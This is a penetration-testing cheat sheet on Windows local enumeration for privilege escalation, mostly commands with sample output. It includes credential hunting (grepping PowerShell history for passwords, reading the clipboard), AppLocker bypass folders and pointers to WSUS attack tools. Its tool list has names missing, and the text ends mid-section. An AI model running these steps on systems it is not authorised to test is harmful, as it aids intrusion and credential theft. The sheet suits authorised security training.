<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Windows Local Enumeration
### References
<details><summary>References (Click to expand)</summary><p>

* Hacktricks Blog: Access Tokens -<br />[https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/access-tokens](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/access-tokens)
</p></details>

### Overview
* Initial Windows Theory
	* Access Tokens
	* ACLs - DACLs/SACLs/ACEs
	* Integrity Levels

### Tools
* WinPEAS
* <details><summary>PS (Click to expand)</summary><p>
	* Check for misconfigurations and sensitive files (). Detected.
	* Check for some possible misconfigurations and gather info ().
	* Check for misconfigurations
	* It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.
	* Extracts crendentials from Credential Manager. Detected.
	* Spray gathered passwords across domain
	* Inveigh is a PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool.
	* Basic privesc Windows enumeration
	* Search for known privesc vulnerabilities (DEPRECATED for Watson)
	* Local checks (Need Admin rights)
* <details><summary>Exe (Click to expand)</summary><p>
	* Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ()
	* Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) ()
	* Extracts credentials from lots of softwares (precompiled exe in github)
	* Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.
	* Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.
* <details><summary>Bat (Click to expand)</summary><p>
	* Tool created based in this post (it does not need accesschk to work properly but it can use it).
* <details><summary>Local (Click to expand)</summary><p>
	* Reads the output of systeminfo and recommends working exploits (local python)
	* Reads the output of systeminfo andrecommends working exploits (local python)
* <details><summary>Meterpreter (Click to expand)</summary><p>
	* `multi/recon/local_exploit_suggestor`
	* You have to compile the project using the correct version of .NET (). To see the installed version of .NET on the victim host you can do:
		* `C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe` -version #Compile the code with the version given in "Build Engine version" line

### Process
1. <details><summary>System Information (Click to expand)</summary><p>
	* <details><summary>Version info enumeration (Click to expand)</summary><p>
		* Check if the Windows version has any known vulnerability (check also the patches applied).
			* Command Shell

					systeminfo
				* <details><summary>Sample Output (Click to expand)</summary><p>

						Host Name:                 DESKTOP-RLTBTA1
						OS Name:                   Microsoft Windows 10 Enterprise
						OS Version:                10.0.19043 N/A Build 19043
						OS Manufacturer:           Microsoft Corporation
						OS Configuration:          Standalone Workstation
						OS Build Type:             Multiprocessor Free
						Registered Owner:          Windows User
						Registered Organization:
						Product ID:                00329-10286-33841-AA639
						Original Install Date:     5/26/2021, 2:43:13 PM
						System Boot Time:          12/22/2021, 1:21:59 PM
						System Manufacturer:       VMware, Inc.
						System Model:              VMware7,1
						System Type:               x64-based PC
						Processor(s):              1 Processor(s) Installed.
						                           [01]: Intel64 Family 6 Model 158 Stepping 10 GenuineIntel ~2592 Mhz
						BIOS Version:              VMware, Inc. VMW71.00V.18452719.B64.2108091906, 8/9/2021
						Windows Directory:         C:\Windows
						System Directory:          C:\Windows\system32
						Boot Device:               \Device\HarddiskVolume1
						System Locale:             en-us;English (United States)
						Input Locale:              en-us;English (United States)
						Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
						Total Physical Memory:     8,191 MB
						Available Physical Memory: 5,551 MB
						Virtual Memory: Max Size:  9,471 MB
						Virtual Memory: Available: 7,148 MB
						Virtual Memory: In Use:    2,323 MB
						Page File Location(s):     C:\pagefile.sys
						Domain:                    WORKGROUP
						Logon Server:              \\DESKTOP-RLRBTC8
						Hotfix(s):                 5 Hotfix(s) Installed.
						                           [01]: KB5006365
						                           [02]: KB5000736
						                           [03]: KB5005033
						                           [04]: KB5007273
						                           [05]: KB5005260
						Network Card(s):           2 NIC(s) Installed.
						                           [01]: Intel(R) 82574L Gigabit Network Connection
						                                 Connection Name: Ethernet0
						                                 DHCP Enabled:    Yes
						                                 DHCP Server:     172.16.68.254
						                                 IP address(es)
						                                 [01]: 172.16.68.151
						                                 [02]: fe80::e46f:440a:e5f:261e
						                           [02]: Bluetooth Device (Personal Area Network)
						                                 Connection Name: Bluetooth Network Connection
						                                 Status:          Media disconnected
						Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
		* Filter Systeminfo Results
			* Command Shell

					systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
				* <details><summary>Sample Output (Click to expand)</summary><p>

						OS Name:                   Microsoft Windows 10 Enterprise
						OS Version:                10.0.19043 N/A Build 19043
		* Get system architecture
			* Command Shell

					wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
				* <details><summary>Sample Output (Click to expand)</summary><p>

						OSArchitecture
						64-bit
		* Current OS version
			* PowerShell

					[System.Environment]::OSVersion.Version
				* <details><summary>Sample Output (Click to expand)</summary><p>

						Major  Minor  Build  Revision
						-----  -----  -----  --------
						10     0      19043  0
	* <details><summary>Patches (Click to expand)</summary><p>
		* Command Shell

				wmic qfe get Caption,Description,HotFixID,InstalledOn
			* <details><summary>Sample Output (Click to expand)</summary><p>

					Caption                                     Description      HotFixID   InstalledOn
					http://support.microsoft.com/?kbid=5007289  Update           KB5007289  12/22/2021
					https://support.microsoft.com/help/5000736  Update           KB5000736  4/9/2021
					https://support.microsoft.com/help/5005033  Security Update  KB5005033  8/13/2021
					                                            Update           KB5007273  12/14/2021
					                                            Security Update  KB5005260  8/13/2021
		* PowerShell

				Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid}
			* <details><summary>Sample Output (Click to expand)</summary><p>

					KB5007289
					KB5000736
					KB5005033
					KB5007273
					KB5005260
			* List only "Security Update" patches
				* Command Shell

						Get-Hotfix -description "Security update"
	* <details><summary>Environment (Click to expand)</summary><p>
		* Check environment variables
			* Command Shell

				set
			* <details><summary>Sample Output (Click to expand)</summary><p>

					ALLUSERSPROFILE=C:\ProgramData
					APPDATA=C:\Users\USER1\AppData\Roaming
					CommonProgramFiles=C:\Program Files\Common Files
					CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
					CommonProgramW6432=C:\Program Files\Common Files
					COMPUTERNAME=DESKTOP-RLRBTC8
					ComSpec=C:\Windows\system32\cmd.exe
					DriverData=C:\Windows\System32\Drivers\DriverData
					FPS_BROWSER_APP_PROFILE_STRING=Internet Explorer
					FPS_BROWSER_USER_PROFILE_STRING=Default
					HOMEDRIVE=C:
					HOMEPATH=\Users\USER1
					LOCALAPPDATA=C:\Users\USER1\AppData\Local
					LOGONSERVER=\\DESKTOP-RLRBTC8
					NUMBER_OF_PROCESSORS=2
					OneDrive=C:\Users\Thomas Preston\OneDrive
					OS=Windows_NT
					Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Thomas Preston\AppData\Local\Microsoft\WindowsApps;
					PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
					PROCESSOR_ARCHITECTURE=AMD64
					PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 158 Stepping 10, GenuineIntel
					PROCESSOR_LEVEL=6
					PROCESSOR_REVISION=9e0a
					ProgramData=C:\ProgramData
					ProgramFiles=C:\Program Files
					ProgramFiles(x86)=C:\Program Files (x86)
					ProgramW6432=C:\Program Files
					PROMPT=$P$G
					PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
					PUBLIC=C:\Users\Public
					SESSIONNAME=Console
					SystemDrive=C:
					SystemRoot=C:\Windows
					TEMP=C:\Users\USER1~1\AppData\Local\Temp
					TMP=C:\Users\USER1~1\AppData\Local\Temp
					USERDOMAIN=DESKTOP-RLTBTA1
					USERDOMAIN_ROAMINGPROFILE=DESKTOP-RLTBTA1
					USERNAME=USER1
					USERPROFILE=C:\Users\USER1
					windir=C:\Windows
		* PowerShell

				dir env:
			* <details><summary>Environment (Click to expand)</summary><p>

					Name                           Value
					----                           -----
					ALLUSERSPROFILE                C:\ProgramData
					APPDATA                        C:\Users\Thomas Preston\AppData\Roaming
					CommonProgramFiles             C:\Program Files\Common Files
					CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files
					CommonProgramW6432             C:\Program Files\Common Files
					COMPUTERNAME                   DESKTOP-RLRBTC8
					ComSpec                        C:\Windows\system32\cmd.exe
					DriverData                     C:\Windows\System32\Drivers\DriverData
					FPS_BROWSER_APP_PROFILE_STRING Internet Explorer
					FPS_BROWSER_USER_PROFILE_ST... Default
					HOMEDRIVE                      C:
					HOMEPATH                       \Users\Thomas Preston
					LOCALAPPDATA                   C:\Users\Thomas Preston\AppData\Local
					LOGONSERVER                    \\DESKTOP-RLRBTC8
					NUMBER_OF_PROCESSORS           2
					OneDrive                       C:\Users\Thomas Preston\OneDrive
					OS                             Windows_NT
					Path                           C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPo...
					PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
					PROCESSOR_ARCHITECTURE         AMD64
					PROCESSOR_IDENTIFIER           Intel64 Family 6 Model 158 Stepping 10, GenuineIntel
					PROCESSOR_LEVEL                6
					PROCESSOR_REVISION             9e0a
					ProgramData                    C:\ProgramData
					ProgramFiles                   C:\Program Files
					ProgramFiles(x86)              C:\Program Files (x86)
					ProgramW6432                   C:\Program Files
					PSModulePath                   C:\Users\Thomas Preston\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsP...
					PUBLIC                         C:\Users\Public
					SESSIONNAME                    Console
					SystemDrive                    C:
					SystemRoot                     C:\Windows
					TEMP                           C:\Users\THOMAS~1\AppData\Local\Temp
					TMP                            C:\Users\THOMAS~1\AppData\Local\Temp
					USERDOMAIN                     DESKTOP-RLRBTC8
					USERDOMAIN_ROAMINGPROFILE      DESKTOP-RLRBTC8
					USERNAME                       Thomas Preston
					USERPROFILE                    C:\Users\Thomas Preston
					windir                         C:\Windows


				Get-ChildItem Env: | ft Key,Value
				PowerShell History
		* Find where the where is saved

				ConsoleHost_history
		* Other Commands

				type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
				type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
				type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
				cat (Get-PSReadlineOption).HistorySavePath
				cat (Get-PSReadlineOption).HistorySavePath | sls passw
	* <details><summary>PowerShell Transcript files (Click to expand)</summary><p>
		* Enable
			* [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
		* Check if registry enabled

				reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
				reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
				reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
				reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
				dir C:\Transcripts
		* Start a Transcription session

				Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
				Stop-Transcript
	* <details><summary>PowerShell Module Logging (Click to expand)</summary><p>
		* PowerShell Module Logging records the Powershell pipeline execution details
			* Command invocations
			* Some portion of the scripts
			* Not all execution/output details are captured
		* <details><summary>Overview (Click to expand)</summary><p>
			* Similar to PowerShell Transcript Files, but enable "Module Logging" instead of "Powershell Transcription"
		* Enumeration

				reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
				reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
				reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
				reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
		* View the last X events from PowerShell logs

				Get-WinEvent -LogName "windows Powershell" | select -First 10 | Out-GridView
	* <details><summary>PowerShell  Script Block Logging (Click to expand)</summary><p>
		* <details><summary>Overview (Click to expand)</summary><p>
			* PowerShell Script Block Logging records block of code as they are executed.
			* The method therefore captures the complete activity and full content of the script.
			* The method maintains the complete audit trail of each activity which can be used later in forensics and to study the malicious behavior.
			* The method records all the activity at time of execution thus provides the complete details.
		* Enumeration

				reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
				reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
				reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
				reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
			* The Script Block logging events can be found in Windows Event viewer under following path: `Application and Sevices Logs > Microsoft > Windows > Powershell > Operational`
			* To view the last X events you can use:

					Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 10 | Out-Gridview
	* <details><summary>Internet Settings (Click to expand)</summary><p>
		* Command Shell
			* Query Current User

					reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
				* <details><summary>Sample Output (Click to expand)</summary><p>

						HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings
						    CertificateRevocation    REG_DWORD    0x1
						    DisableCachingOfSSLPages    REG_DWORD    0x0
						    IE5_UA_Backup_Flag    REG_SZ    5.0
						    PrivacyAdvanced    REG_DWORD    0x1
						    SecureProtocols    REG_DWORD    0xa80
						    User Agent    REG_SZ    Mozilla/4.0 (compatible; MSIE 8.0; Win32)
						    ZonesSecurityUpgrade    REG_BINARY    2BFC14B35BF7D701
						    WarnonZoneCrossing    REG_DWORD    0x0
						    EnableNegotiate    REG_DWORD    0x1
						    ProxyEnable    REG_DWORD    0x0
						    MigrateProxy    REG_DWORD    0x1
						    LockDatabase    REG_QWORD    0x1d7a580448f2847

						HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0
						HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Cache
						HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections
						HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Http Filters
						HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Lockdown_Zones
						HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\P3P
						HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Passport
						HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\TemplatePolicies
						HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad
						HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap
						HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones
			* Query Local Machine

					reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
				* <details><summary>Sample Output (Click to expand)</summary><p>

						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings
						    ActiveXCache    REG_SZ    C:\Windows\Downloaded Program Files
						    CodeBaseSearchPath    REG_SZ    CODEBASE
						    EnablePunycode    REG_DWORD    0x1
						    MinorVersion    REG_SZ    0
						    WarnOnIntranet    REG_DWORD    0x1

						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Accepted Documents
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ActiveX Cache
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AllowedBehaviors
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AllowedDragImageExts
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AllowedDragProtocols
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ApprovedActiveXInstallSites
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Cache
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Configuration
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Http Filters
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Last Update
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Lockdown_Zones
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\LUI
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\NoFileLifetimeExtension
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\P3P
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Passport
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\PluggableProtocols
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\PolicyExtensions
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Secure Mime Handlers
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\SO
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\SOIEAK
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\TemplatePolicies
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Url History
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\User Agent
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap
						HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones
	* <details><summary>Drives (Click to expand)</summary><p>
		* Command Shell
			* 1

					wmic logicaldisk get caption || fsutil fsinfo drives
				* <details><summary>Sample Output (Click to expand)</summary><p>

						Caption
						C:
						D:
						Z:
			* 2

					wmic logicaldisk get caption,description,providername
				* <details><summary>Sample Output (Click to expand)</summary><p>

						Caption  Description         ProviderName
						C:       Local Fixed Disk
						D:       CD-ROM Disc
						Z:       Network Connection
		* PowerShell
			* 1

					Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
				* <details><summary>Sample Output (Click to expand)</summary><p>

						Name Root
						---- ----
						C    C:\
						D    D:\
						Z    Z:\
1. <details><summary>WSUS (Click to expand)</summary><p>
	* <details><summary>References (Click to expand)</summary><p>
		* WSUS CVE-2020-1013 report -<br />[https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
	* <details><summary>Overview (Click to expand)</summary><p>
		* Vulnerable is system updates requested over http (no SSL)
		* The WSUS service runs as an elevated account. The destination of the service's commands can be specified to an attacker-controlled interceptor through Internet Explorer's configuration.
		* The WSUS service uses the current user's settings and certificate store. Generating a self-signed certificate for the WSUS hostname and storing the certificate in the current user's certificate store allows interception of both HTTP and HTTPS WSUS traffic.
			* WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.
	* Vulnerability Check
		* Check if the network uses a non-SSL WSUS update

				reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
			* <details><summary>Sample Output (Click to expand)</summary><p>

					HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate	WUServer	REG_SZ	http://xxxx-updxx.corp.internal.com:8535
			* Vulnerable Status
				* `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` = 1
	* Follow-Up Attack(s)
		* wsuxploit -<br />[https://github.com/pimps/wsuxploit](https://github.com/pimps/wsuxploit)
		* pywsus -<br />[https://github.com/GoSecure/pywsus](https://github.com/GoSecure/pywsus)
		* wsuspicious -<br />[https://github.com/GoSecure/wsuspicious](https://github.com/GoSecure/wsuspicious)
1. <details><summary>AlwaysInstallElevated (Click to expand)</summary><p>
	* Command Shell
		* If these 2 registers are enabled (value is `0x1`), then users of any privilege can install (execute) `*.msi` files as `NT AUTHORITY\SYSTEM`.

				reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
				reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
1. <details><summary>Antivirus and Detectors (Click to expand)</summary><p>
	* <details><summary>Audit Settings (Click to expand)</summary><p>
		* Display what is being logged (Windows audit logging)

				reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
	* <details><summary>WEF (Click to expand)</summary><p>
		* Display where logs are sent (Windows Event Forwarding)

				reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
	* <details><summary>LAPS (Click to expand)</summary><p>
		* <details><summary>Overview (Click to expand)</summary><p>
			* LAPS allows you to manage the local Administrator password (which is randomised, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES.
			* When using LAPS, 2 new attributes appear in the computer objects of the domain: `ms-msc-AdmPwd` and `ms-mcs-AdmPwdExpirationTime`. These attributes contains the plain-text admin password and the expiration time. Then, in a domain environment, it could be interesting to check which users can read these attributes.
		* Enumeration

				reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
	* <details><summary>WDigest (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* HackTricks: wdigest -<br />[https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest](https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest)
		* <details><summary>Overview (Click to expand)</summary><p>
			* If active, plain-text passwords are stored in LSASS (Local Security Authority Subsystem Service).

					reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
	* <details><summary>LSA Protection (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* HackTricks: lsa protection -<br />[https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection](https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection)
		* Microsoft in Windows 8.1 and later has provided additional protection for the LSA to prevent untrusted processes from being able to read its memory or to inject code.

				reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
	* <details><summary>Credentials Guard (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* HackTricks: Credential Guard -<br />[https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard(https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard)]
		* <details><summary>Overview (Click to expand)</summary><p>
			* Credential Guard is a new feature in Windows 10 (Enterprise and Education edition) that helps to protect your credentials on a machine from threats such as pass the hash.

				reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
	* <details><summary>Cached Credentials (Click to expand)</summary><p>
		* <details><summary>Overview (Click to expand)</summary><p>
			* Domain credentials are used by operating system components and are authenticated by the Local Security Authority (LSA). Typically, domain credentials are established for a user when a registered security package authenticates the user's logon data.
		* Enumeration

				reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
	* <details><summary>AV (Click to expand)</summary><p>
		* Check for anti virus software

				WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more
				Get-MpComputerStatus 
	* <details><summary>AppLocker Policy (Click to expand)</summary><p>
		* Check which files/extensions are blacklisted/whitelisted

				Get-ApplockerPolicy -Effective -xml
				Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
				$a = Get-ApplockerPolicy -effective
				$a.rulecollections
		* Useful Writable folders to bypass AppLocker Policy
			* `C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys`
			* `C:\Windows\System32\spool\drivers\color`
			* `C:\Windows\Tasks`
			* `C:\windows\tracing`
	* <details><summary>UAC (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* HackTricks: UAC -<br />[https://book.hacktricks.xyz/windows/authentication-credentials-uac-and-efs#uac](https://book.hacktricks.xyz/windows/authentication-credentials-uac-and-efs#uac)
		* <details><summary>Overview (Click to expand)</summary><p>
			* UAC is used to allow an administrator user to not give administrator privileges to each process executed. This is achieved using default the low privileged token of the user.

					reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ 	
1. <details><summary>Users & Groups (Click to expand)</summary><p>
	* <details><summary>Enumerate Users & Groups (Click to expand)</summary><p>
		* You should check if any of the groups where you belong have interesting permissions
			* Command Script
				* Identify current user
					
					net users %username%
				* Identify all local users

					net users
				* Identify local groups

					net localgroup
				* Identify members of the Administrators group

					net localgroup Administrators
				* List current user privileges

					whoami /all
			* PowerShell

					Get-WmiObject -Class Win32_UserAccount
					Get-LocalUser | ft Name,Enabled,LastLogon
					Get-ChildItem C:\Users -Force | select Name
					Get-LocalGroupMember Administrators | ft Name, PrincipalSource
	* <details><summary>Privileged groups (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* HackTricks: Privileged Accounts and Token Privileges -<br />[https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges](https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges)
		* <details><summary>Overview (Click to expand)</summary><p>
			* If you belongs to some privileged group you may be able to escalate privileges. Learn about privileged groups and how to abuse them to escalate privileges here:
	* <details><summary>Token manipulation (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* .
	* <details><summary>Logged users / Sessions (Click to expand)</summary><p>
		* Enumeration

				qwinsta
				klist sessions
	* <details><summary>Home folders (Click to expand)</summary><p>
		* Enumeration

				dir C:\Users
				Get-ChildItem C:\Users
	* <details><summary>Password Policy (Click to expand)</summary><p>
		* Enumeration

				net accounts
	* <details><summary>Get the content of the clipboard (Click to expand)</summary><p>
		* Enumeration

				powershell -command "Get-Clipboard"
* <details><summary>Running Processes (Click to expand)</summary><p>
	* File and Folder Permissions
		* <details><summary>References (Click to expand)</summary><p>
			* HackTricks: DLL Hijacking -<br />[https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking(https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking)]
			* HackTricks: Electron CEF Chromium Debugger Abuse -<br />[https://book.hacktricks.xyz/linux-unix/privilege-escalation/electron-cef-chromium-debugger-abuse](https://book.hacktricks.xyz/linux-unix/privilege-escalation/electron-cef-chromium-debugger-abuse)
			* HackTricks: DLL Hijacking -<br />[https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking)
		* <details><summary>Overview (Click to expand)</summary><p>
			* List processes to identify is passwords were used in command-line process creation
		* Process
			* Check if you can overwrite some binary running or if you have write permissions of the binary folder to exploit possible 
				* List processes running and services
					
					Tasklist /SVC
				* Filter "system" processes

					tasklist /v /fi "username eq system"
			* With allowed Usernames

					Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
			* Without usernames

					Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
			* Always check for possible 
				* Checking permissions of the processes binaries

						for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
							for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
								icacls "%%z" 
						2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
							)
						)
			* Checking permissions of the folders of the processes binaries

					(
					)
					for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v 
					"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
						icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users 
					todos %username%" && echo.
					)
	* <details><summary>Memory Password mining (Click to expand)</summary><p>
